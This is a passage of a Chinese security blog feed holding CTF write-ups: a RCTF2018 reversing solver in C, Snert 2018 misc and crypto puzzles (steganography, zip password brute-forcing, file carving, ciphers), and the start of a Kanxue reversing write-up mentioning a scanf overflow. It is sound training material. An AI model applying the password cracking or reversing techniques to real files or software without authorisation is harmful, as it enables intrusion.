href="https://i.loli.net/2018/07/16/5b4c612a2f2f2.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/16/5b4c612a2f2f2.jpg" class="lazyload"></a></p><p>主函数判断输入格式，v4处可以看到，是将其<strong>八位即四字节一组(int大小为2字节，8/2=4)</strong>进行分组</p><p>然后sub_804882B内是回显<br><a href="https://i.loli.net/2018/07/16/5b4c612a42428.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/16/5b4c612a42428.jpg" class="lazyload"></a></p><p>sub_8048A41和sub_8048980不太清楚是干嘛的，应该是初始化和转换之类的</p><p><strong>算法位于sub_80488E0内</strong></p><p>先记住<strong>sub_80488E0(&amp;v6, 0xA72BE4C1, 0x1D082C23, seed, v4, v3);</strong>，后面有用</p><h3 id="内部"><a href="#内部" class="headerlink" title="内部"></a>内部</h3><p><a href="https://i.loli.net/2018/07/16/5b4c612a57264.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/16/5b4c612a57264.jpg" class="lazyload"></a></p><p>看到一个30次的循环，嵌套sub_804868B<br>进去看看</p><p><a href="https://i.loli.net/2018/07/16/5b4c612a6b196.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/16/5b4c612a6b196.jpg" class="lazyload"></a></p><p>现在整个算法的全貌就展示在了我们面前</p><p>逐位循环0x20F次换算成四字节一组也就是0x20F/4=0x7F<br>于是我们只需要从0x20到0x7F进行枚举，按照相应算法对out进行比较即可,注意80488E0一开始传入的两个字符串需要互换然后合并</p><p>解题脚本如下</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">#include &lt;stdint.h&gt;</span><br><span class="line">uint32_t foo(uint32_t a1, uint64_t a2) &#x2F;&#x2F; sub_804868B</span><br><span class="line">&#123;</span><br><span class="line">    int j;</span><br><span class="line">    uint64_t v5;</span><br><span class="line">    uint32_t in;</span><br><span class="line">    in &#x3D; a1;</span><br><span class="line">    for (j &#x3D; 0; j &lt;&#x3D; 527; ++j)</span><br><span class="line">    &#123;</span><br><span class="line">        v5 &#x3D; a2 &gt;&gt; (j &amp; 0x1F);</span><br><span class="line">        if (j &amp; 0x20)</span><br><span class="line">            v5 &#x3D; v5 &gt;&gt; 32;           &#x2F;&#x2F;高低位转换 </span><br><span class="line">        in &#x3D; (in &gt;&gt; 1) ^ ((v5 ^ in ^ (in &gt;&gt; 16) ^ (0x5C743A2E &gt;&gt; (((in &gt;&gt; 1) &amp; 1)</span><br><span class="line">            + 2</span><br><span class="line">            * (2</span><br><span class="line">                * (((in &gt;&gt; 20) &amp; 1)</span><br><span class="line">                    + 2* (2 * (in &gt;&gt; 31) + ((in &gt;&gt; 26) &amp; 1)))</span><br><span class="line">                + ((in &gt;&gt; 9) &amp; 1))))) &lt;&lt; 31);</span><br><span class="line">    &#125;</span><br><span class="line">    return in;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    uint32_t data[30] &#x3D; &#x2F;&#x2F; out</span><br><span class="line">    &#123;</span><br><span class="line">        0xB80C91FE,0x70573EFE,</span><br><span class="line">        0xBEED92AE,0x7F7A8193,</span><br><span class="line">        0x7390C17B,0x90347C6C,</span><br><span class="line">        0xAA7A15DF,0xAA7A15DF,</span><br><span class="line">        0x526BA076,0x153F1A32,</span><br><span class="line">        0x545C15AD,0x7D8AA463,</span><br><span class="line">        0x526BA076,0xFBCB7AA0,</span><br><span class="line">        0x7D8AA463,0x9C513266,</span><br><span class="line">        0x526BA076,0x6D7DF3E1,</span><br><span class="line">        0xAA7A15DF,0x9C513266,</span><br><span class="line">        0x1EDC3864,0x9323BC07,</span><br><span class="line">        0x7D8AA463,0xFBCB7AA0,</span><br><span class="line">        0x153F1A32,0x526BA076,</span><br><span class="line">        0xF5650025,0xAA7A15DF,</span><br><span class="line">        0x1EDC3864,0xB13AD888</span><br><span class="line">    &#125;;</span><br><span class="line">    int i;</span><br><span class="line">    uint32_t j;</span><br><span class="line">    for (i &#x3D; 0; i &lt; 30; i++)</span><br><span class="line">        for (j &#x3D; 0x20; j &lt; 0x7F; j++)                    &#x2F;&#x2F;0x20F&#x2F;4&#x3D;0x7F </span><br><span class="line">            if (foo(j, 0x1D082C23A72BE4C1) &#x3D;&#x3D; data[i])   &#x2F;&#x2F;互换，合并 </span><br><span class="line">                printf(&quot;%c&quot;, j);</span><br><span class="line">    printf(&quot;\n&quot;);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h2 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h2><p><a href="https://i.loli.net/2018/07/16/5b4c612a7fbca.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/16/5b4c612a7fbca.jpg" class="lazyload"></a></p><p>解出： RCTF{Kee1o9_1s_a1ready_so1ved}</p>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;h1 id=&quot;RCTF2018-babyre-WriteUp&quot;&gt;&lt;a href=&quot;#RCTF2018-babyre-WriteUp&quot; class=&quot;headerlink&quot; title=&quot;RCTF2018 babyre WriteUp&quot;&gt;&lt;/a&gt;RCTF2018 babyre</summary>
        
      
    
    
    
    <category term="逆向" scheme="https://kabeor.github.io/categories/%E9%80%86%E5%90%91/"/>
    
    
  </entry>
  
  <entry>
    <title>Snert-2018春季淘汰赛Misc,Crypto WriteUp</title>
    <link href="https://kabeor.github.io/Snert-2018%E6%98%A5%E5%AD%A3%E6%B7%98%E6%B1%B0%E8%B5%9BMisc,Crypto%20WriteUp/"/>
    <id>https://kabeor.github.io/Snert-2018%E6%98%A5%E5%AD%A3%E6%B7%98%E6%B1%B0%E8%B5%9BMisc,Crypto%20WriteUp/</id>
    <published>2018-07-15T16:00:00.000Z</published>
    <updated>2020-03-16T04:49:26.376Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Misc100-black"><a href="#Misc100-black" class="headerlink" title="Misc100 black"></a>Misc100 black</h1><p>给了张图，估计隐写<br><a href="https://i.loli.net/2018/07/16/5b4c78f66cea7.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/16/5b4c78f66cea7.jpg" class="lazyload"></a></p><p>掏出神器StegSolve<br><a href="https://i.loli.net/2018/07/16/5b4c78f6d153e.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/16/5b4c78f6d153e.jpg" class="lazyload"></a><br>点下面的箭头到Random color就看见了<br><a href="https://i.loli.net/2018/07/16/5b4c78f7b9d20.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/16/5b4c78f7b9d20.jpg" class="lazyload"></a></p><h1 id="Misc200-我在哪"><a href="#Misc200-我在哪" class="headerlink" title="Misc200 我在哪"></a>Misc200 我在哪</h1><p><a href="https://i.loli.net/2018/07/16/5b4c78f7d03f8.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/16/5b4c78f7d03f8.jpg" class="lazyload"></a></p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">12343254634532412342423423412435645756879076845643521343254365756f2423423412435645756879076845643521343254365756242342341243564575687907684564352134325436575624234234124356457568790768456435213432543657562423423412435645756879076845643521343254365756242342341243564575687907684564352134325436575624234234124356457568790768456435213432543657562423423412435645756879076845643521343254365756l24234234124356457568790768456435213432543657562423423412435645756879076845643521343254365756242342341243564575687907684564352134325436575624234234124356457568790768456435213432543657562423423412435645756879076845643521343254365756a024234234124356457568790768456435213432543657561343254365756242134325436575624213432543657562421343254365756242g2423423412435645756879076845643521343254365756242342341243564575687907684564352134325436575624234234124356457568790768456435213432543657562423423412435645756879076845643521343254365756&#123;352134325436575624235213432543657562423521343254365756242352134325436575624235213432543657562423521343254365756242f3521343254365756242352134325436575624235213432543657562423521343254365756242352134325436575624235213432543657562423521343254365756242352134325436575624235213432543657562423521343254365756242352134325436575624235213432543657562423521343254365756242352134325436575624235213432543657562423521343254365756242352134325436575624235213432543657562423521343254365756242352134325436575624235213432543657562423521343254365756242352134325436575624235213432543657562423521343254365756242352134325436575624235213432543657562423521343254365756242f3521343254365756242352134325436575624235213432543657562423521343254365756242352134325436575624235213432543657562423521343254365756242352134325436575624235213432543657562423521343254365756242f352134325436575624235213432543657562423521343254365756242352134325436575624235213432543657562423521343254365756242352134325436575624235213432543657562423521343254365756242352134325436575624235213432543657562423521343254365756242352134325436575624235213432543657562423521343254365756242f3521343254365756242352134325436575624235213432543657562423521343254365756242352134325436575624235213432543657562423521343254365756242352134325436575624235213432543657562423521343254365756242352134325436575624235213432543657562423521343254365756242f35213432543657562423521343254365756242352134325436575624235213432543657562423521343254365756242352134325436575624235213432543657562423521343254365756242352134325436575624235213432543657562423521343254365756242352134325436575624235213432543657562423521343254365756242f35213432543657562423521343254365756242352134325436575624235213432543657562423521343254365756242352134325436575624235213432543657562423521343254365756242352134325436575624235213432543657562423521343254365756242352134325436575624235213432543657562423521343254365756242u3521343254365756242352134325436575624235213432543657562423521343254365756242352134325436575624235213432543657562423521343254365756242c3521343254365756242352134325436575624235213432543657562423521343254365756242352134325436575624235213432543657562423521343254365756242352134325436575624235213432543657562423521343254365756242kt352134325436575624235213432543657562423521343254365756242352134325436575624235213432543657562423521343254365756242352134325436575624235213432543657562423521343254365756242h352134325436575624235213432543657562423521343254365756242352134325436575624235213432543657562423521343254365756242352134325436575624235213432543657562423521343254365756242352134325436575624235213432543657562423521343254365756242352134325436575624235213432543657562423521343254365756242i35213432543657562423521343254365756242352134325436575624235213432543657562423521343254365756242352134325436575624235213432543657562423521343254365756242s35213432543657562423521343254365756242352134325436575624235213432543657562423521343254365756242&#125;3521343254365756242352134325436575624235213432543657562423521343254365756242352134325436575624235213432543657562423521343254365756242352134325436575624235213432543657562423521343254365756242352134325436575624235213432543657562423521343254365756242352134325436575624235213432543657562423521343254365756242352134325436575624213432543657562421343254365756242</span><br></pre></td></tr></table></figure></div><p>给了一大堆，但是我从里面看见了f等字母，不想费眼睛，新建word，把数字全部替换为空即可<br><a href="https://i.loli.net/2018/07/16/5b4c78f7e3df0.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/16/5b4c78f7e3df0.jpg" class="lazyload"></a></p><blockquote><p>官方wp<br>用的是脚本</p></blockquote><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">str=<span class="string">"xxxxxxxxxx"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> str:</span><br><span class="line">    <span class="keyword">if</span> i.isdigit():</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">print</span> i</span><br></pre></td></tr></table></figure></div><h1 id="Misc300-某人的猫"><a href="#Misc300-某人的猫" class="headerlink" title="Misc300 某人的猫"></a>Misc300 某人的猫</h1><p><a href="https://i.loli.net/2018/07/16/5b4c78f812933.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/16/5b4c78f812933.jpg" class="lazyload"></a></p><p>给了个压缩包，winhex看了，并不是伪加密，于是掏出神器Ziperello,设定1到8位纯数字爆破，五秒真男人后就成功了</p><p><a href="https://i.loli.net/2018/07/16/5b4c78f83d9e2.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/16/5b4c78f83d9e2.jpg" class="lazyload"></a></p><p>打开txt看看</p><p><a href="https://i.loli.net/2018/07/16/5b4c78f864b5e.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/16/5b4c78f864b5e.jpg" class="lazyload"></a><br>非常的长<br>没有base64的特点，想到了16进制转字符串，试试</p><p><a href="https://i.loli.net/2018/07/16/5b4c78f887a84.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/16/5b4c78f887a84.jpg" class="lazyload"></a><br>乱码了，不过看见了PNG，那肯定是转图片咯<br>使用16进制转图片的软件<br><a href="https://i.loli.net/2018/07/16/5b4c79177503d.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/16/5b4c79177503d.jpg" class="lazyload"></a><br>得到一张照片<br><a href="https://i.loli.net/2018/07/16/5b4c79178a87b.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/16/5b4c79178a87b.jpg" class="lazyload"></a><br>扫一扫<br>得到<br><a href="https://i.loli.net/2018/07/16/5b4c79179e38d.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/16/5b4c79179e38d.jpg" class="lazyload"></a><br>没什么头绪，放进kali中binwalk一下，中奖了<br><a href="https://i.loli.net/2018/07/16/5b4c7917c528e.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/16/5b4c7917c528e.jpg" class="lazyload"></a><br>五张，第一张就是那个二维码，其他的用dd命令分离<br><code>dd if=1.jpg of=2.jpg skip=12280 bs=1</code><br>这里if是指定输入文件，of是指定输出文件，skip是指定从输入文件开头跳过12280个块后再开始复制，bs设置每次读写块的大小为1字节.</p><p><a href="https://i.loli.net/2018/07/16/5b4c7917e9c35.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/16/5b4c7917e9c35.jpg" class="lazyload"></a><br>最后的flag</p><blockquote><p>官方wp</p></blockquote><blockquote><p>千禧年:2000年<br>md5:2adf764239cce9d9052b0670bbbbb455<br>纯考写脚本<br>思路就是md5碰撞去匹配生日，但是考点在如何从12*31个md5中去找到那个被修改了一位之前的<br>md5<br>py中有现成的库difflib 去比较两个字符串的相似程度，所以找出其中相似值最大的就好了</p></blockquote><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> difflib</span><br><span class="line">days=[]</span><br><span class="line"><span class="comment"># 生成生日日期</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">13</span>):</span><br><span class="line">    <span class="keyword">if</span> i &lt;=<span class="number">9</span>:</span><br><span class="line">        mounth=<span class="string">'0'</span>+str(i)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        mounth=str(i)</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">32</span>):</span><br><span class="line">        <span class="keyword">if</span> j &lt;=<span class="number">9</span>:</span><br><span class="line">            day=<span class="string">'0'</span>+str(j)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            day=str(j)</span><br><span class="line">        birth=<span class="string">'1997'</span>+mounth+day</span><br><span class="line">        days.append(birth)</span><br><span class="line"></span><br><span class="line">code=<span class="string">'2adf764239cce9d9052b0670bbbbb455'</span></span><br><span class="line"></span><br><span class="line">result = &#123;&#125;</span><br><span class="line">ratios = []</span><br><span class="line"></span><br><span class="line"><span class="comment">#碰撞md5，并计算相似值，以字典的形式储存最后读取出相似值最高的值</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> day <span class="keyword">in</span> days:</span><br><span class="line">    md5 = hashlib.md5(day.encode(<span class="string">'utf‐8'</span>)).hexdigest()</span><br><span class="line">    seq = difflib.SequenceMatcher(<span class="literal">None</span>,md5,code)</span><br><span class="line">    ratio = seq.ratio()</span><br><span class="line">    ratios.append(ratio)</span><br><span class="line">    result[ratio]=day</span><br><span class="line">    <span class="keyword">print</span> ratio,day</span><br><span class="line"></span><br><span class="line">tmax = max(ratios)</span><br><span class="line"><span class="keyword">print</span> tmax</span><br><span class="line"><span class="keyword">print</span> result[tmax]</span><br></pre></td></tr></table></figure></div><h1 id="Misc200-flag去哪了"><a href="#Misc200-flag去哪了" class="headerlink" title="Misc200 flag去哪了"></a>Misc200 flag去哪了</h1><p>又给了一张图(这张图不会显示)<br><a href="https://i.loli.net/2018/07/16/5b4c791809265.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/16/5b4c791809265.jpg" class="lazyload"></a><br>截图为<br><a href="https://i.loli.net/2018/07/16/5b4c79181c8b2.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/16/5b4c79181c8b2.jpg" class="lazyload"></a><br>这回缺了点什么<br>放进linux不识别，应该是修改了16进制的像素位，所以用winhex看看<br><a href="https://i.loli.net/2018/07/16/5b4c791831ffc.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/16/5b4c791831ffc.jpg" class="lazyload"></a></p><p>对于png文件，其第二行第六七列是高度位，改这一位即可，修改时的数值应该从十进制转为16进制<br><a href="https://i.loli.net/2018/07/16/5b4c7918462ea.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/16/5b4c7918462ea.jpg" class="lazyload"></a><br>保存后查看，也只能截图了<br><a href="https://i.loli.net/2018/07/16/5b4c792fdcd9e.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/16/5b4c792fdcd9e.jpg" class="lazyload"></a><br>那个o是小写。。。</p><h1 id="Crypto100-TAT"><a href="#Crypto100-TAT" class="headerlink" title="Crypto100 TAT"></a>Crypto100 TAT</h1><p><a href="https://i.loli.net/2018/07/16/5b4c792ff0322.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/16/5b4c792ff0322.jpg" class="lazyload"></a><br>对于这道题我只能说，别百度了，Google吧，颜文字密码，aaencode解密即可<br><a href="https://i.loli.net/2018/07/16/5b4c79301014e.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/16/5b4c79301014e.jpg" class="lazyload"></a></p><h1 id="Crypto200-仿射密码"><a href="#Crypto200-仿射密码" class="headerlink" title="Crypto200 仿射密码"></a>Crypto200 仿射密码</h1><p><a href="https://i.loli.net/2018/07/16/5b4c793027d37.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/16/5b4c793027d37.jpg" class="lazyload"></a></p><p>加法密码和乘法密码结合就构成仿射密码，仿射密码的加密和解密算法是：C= Ek(m)=(k1m+k2) mod n<br>M= Dk(c)=k3(c- k2) mod n（其中（k3 ×k1）mod26 = 1）<br>仿射密码具有可逆性的条件是gcd(k1, n)=1。当k1=1时，仿射密码变为加法密码，当k2=0时，仿射密码变为乘法密码。<br>仿射密码中的密钥空间的大小为nφ(n)，当n为26字母，φ(n)=12，因此仿射密码的密钥空间为12×26 = 312。</p><p>让解密，c++写个程序</p><p><a href="https://i.loli.net/2018/07/16/5b4c793066476.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/16/5b4c793066476.jpg" class="lazyload"></a></p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &quot;stdafx.h&quot;</span><br><span class="line">#include&lt;iostream&gt;</span><br><span class="line">#include&lt;string.h&gt;</span><br><span class="line">#include &lt;cstdio&gt;</span><br><span class="line">using namespace std;</span><br><span class="line"></span><br><span class="line">char s[100];</span><br><span class="line">int num[100];</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">while (std::cin &gt;&gt; s)</span><br><span class="line">&#123;</span><br><span class="line">int len &#x3D; (int)strlen(s);</span><br><span class="line">for (int i &#x3D; 0; i &lt; len; i++)</span><br><span class="line">&#123;</span><br><span class="line">num[i] &#x3D; s[i] - &#39;a&#39; + 26;</span><br><span class="line">while ((num[i] - 7) % 11)</span><br><span class="line">&#123;</span><br><span class="line">num[i] +&#x3D; 26;</span><br><span class="line">&#125;</span><br><span class="line">s[i] &#x3D; (num[i] - 7) &#x2F; 11 + &#39;a&#39;;</span><br><span class="line">printf(&quot;%c&quot;, s[i]);</span><br><span class="line">&#125;</span><br><span class="line">putchar(&#39;\n&#39;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p><a href="https://i.loli.net/2018/07/16/5b4c793081d4e.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/16/5b4c793081d4e.jpg" class="lazyload"></a></p><h1 id="Crypto200-animals"><a href="#Crypto200-animals" class="headerlink" title="Crypto200 animals?"></a>Crypto200 animals?</h1><p><a href="https://i.loli.net/2018/07/16/5b4c7930b0019.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/16/5b4c7930b0019.jpg" class="lazyload"></a><br>给了一长串，最后有===，是个base64，于是只能一遍一遍去解了，<br>最后留下一行<br><a href="https://i.loli.net/2018/07/16/5b4c7930c20c0.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/16/5b4c7930c20c0.jpg" class="lazyload"></a></p><p>倒过来</p><pre><code>what kind of animal cry wangwang</code></pre><p>会汪汪的只有dog</p><p>所以    flag{dog}</p><blockquote><p>官方wp<br>n次base64</p></blockquote><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">str=<span class="string">'xxx'</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        a=base64.b64decode(str)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"> <span class="keyword">print</span> a</span><br></pre></td></tr></table></figure></div><h1 id="Crypto300-真正的粉丝0-0"><a href="#Crypto300-真正的粉丝0-0" class="headerlink" title="Crypto300 真正的粉丝0_0"></a>Crypto300 真正的粉丝0_0</h1><p><a href="https://i.loli.net/2018/07/16/5b4c7930d7308.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/16/5b4c7930d7308.jpg" class="lazyload"></a></p><p>并不知道这是什么梗，还好I have a girlfriend</p><p>所以不知道为什么会有 89 64<br>也不知道为什么最后  flag{tooyoungtoosimple}</p><blockquote><p>官方wp</p></blockquote><p>格朗普雷密码,特点是用一个单词或者句子作为棋盘首行，包含26个英文字母，然后用坐标<br>表示字母<br>提示给了为什么没有9和句子中字母的个数提示，一共64个字母，是8*8 的棋盘，所以没有9<br>从上到下把字母放入棋盘</p><pre><code>  1 2 3 4 5 6 7 81 t h e q u i c k 2 b r o w n f o x3 j u m p s o v e4 r t h e l a z y5 d o g a n d a n6 a i v e g u y w7 a n t t o g e t8 a f l a g l o l</code></pre><p>对应 11 27 87 67 52 66 55 85 73 87 27 35 16 33 34 45 77</p><h2 id="完结"><a href="#完结" class="headerlink" title="完结"></a>完结</h2>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;h1 id=&quot;Misc100-black&quot;&gt;&lt;a href=&quot;#Misc100-black&quot; class=&quot;headerlink&quot; title=&quot;Misc100 black&quot;&gt;&lt;/a&gt;Misc100 black&lt;/h1&gt;&lt;p&gt;给了张图，估计隐写&lt;br&gt;&lt;a</summary>
        
      
    
    
    
    <category term="密码学和杂项" scheme="https://kabeor.github.io/categories/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%92%8C%E6%9D%82%E9%A1%B9/"/>
    
    
    <category term="密码学" scheme="https://kabeor.github.io/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
    
    <category term="杂项" scheme="https://kabeor.github.io/tags/%E6%9D%82%E9%A1%B9/"/>
    
    <category term="Misc" scheme="https://kabeor.github.io/tags/Misc/"/>
    
    <category term="Crypto" scheme="https://kabeor.github.io/tags/Crypto/"/>
    
  </entry>
  
  <entry>
    <title>看雪.TSRC 2017CTF秋季赛 ctf2017_Fpc</title>
    <link href="https://kabeor.github.io/%E7%9C%8B%E9%9B%AA.TSRC%202017CTF%E7%A7%8B%E5%AD%A3%E8%B5%9B%20ctf2017_Fpc/"/>
    <id>https://kabeor.github.io/%E7%9C%8B%E9%9B%AA.TSRC%202017CTF%E7%A7%8B%E5%AD%A3%E8%B5%9B%20ctf2017_Fpc/</id>
    <published>2018-07-15T16:00:00.000Z</published>
    <updated>2020-05-03T04:41:55.149Z</updated>
    
    <content type="html"><![CDATA[<h1 id="看雪-TSRC-2017CTF秋季赛-ctf2017-Fpc"><a href="#看雪-TSRC-2017CTF秋季赛-ctf2017-Fpc" class="headerlink" title="看雪.TSRC 2017CTF秋季赛 ctf2017_Fpc"></a>看雪.TSRC 2017CTF秋季赛 ctf2017_Fpc</h1><blockquote><p>自己做再加上分析别人的wp搞了一星期，这道题终于分析透彻了，感觉自己提升了很多。<br>从这道题中学到的新知识有：</p><ol><li>scanf函数的缓冲区溢出漏洞</li><li>RUN跟踪去除花指令</li><li>Z3约束求解器的使用</li></ol></blockquote><h2 id="基本工作"><a href="#基本工作" class="headerlink" title="基本工作"></a>基本工作</h2><p>无壳的exe</p><p>运行一下<br><a href="https://i.loli.net/2018/07/16/5b4c64eb112d1.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/16/5b4c64eb112d1.jpg" class="lazyload"></a></p><p>搜索字符串<br><a href="https://i.loli.net/2018/07/16/5b4c64eb4595b.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/16/5b4c64eb4595b.jpg" class="lazyload"></a><br>进入Please input your code<br>运行后在输入字符串位置断下<br><a href="https://i.loli.net/2018/07/16/5b4c64eb73a1d.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/16/5b4c64eb73a1d.jpg" class="lazyload"></a><br>所以接下来就是算法分析了</p><h2 id="结构分析"><a href="#结构分析" class="headerlink" title="结构分析"></a>结构分析</h2><p>IDA载入，找到主函数<br><a href="https://i.loli.net/2018/07/16/5b4c64eb8d7fd.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/16/5b4c64eb8d7fd.jpg" class="lazyload"></a></p><blockquote><p>main函数内部</p></blockquote><p><a href="https://i.loli.net/2018/07/16/5b4c64eba5379.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/16/5b4c64eba5379.jpg" class="lazyload"></a></p><p>dword_41B034的初值为2</p><p>可以看到判断是否成功前调用了三个call 401050，401090和4010E0<br>其中401050为打印题目并调用    <code>scanf()</code>    <strong>(注意，这很重要，后面有解释)</strong></p><p>后两个看来就是解密函数了，分析一下</p><blockquote><p>sub_401090</p></blockquote><p><a href="https://i.loli.net/2018/07/16/5b4c64ebbce31.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/16/5b4c64ebbce31.jpg" class="lazyload"></a><br><a href="https://i.loli.net/2018/07/16/5b4c64ebd2705.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/16/5b4c64ebd2705.jpg" class="lazyload"></a></p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight 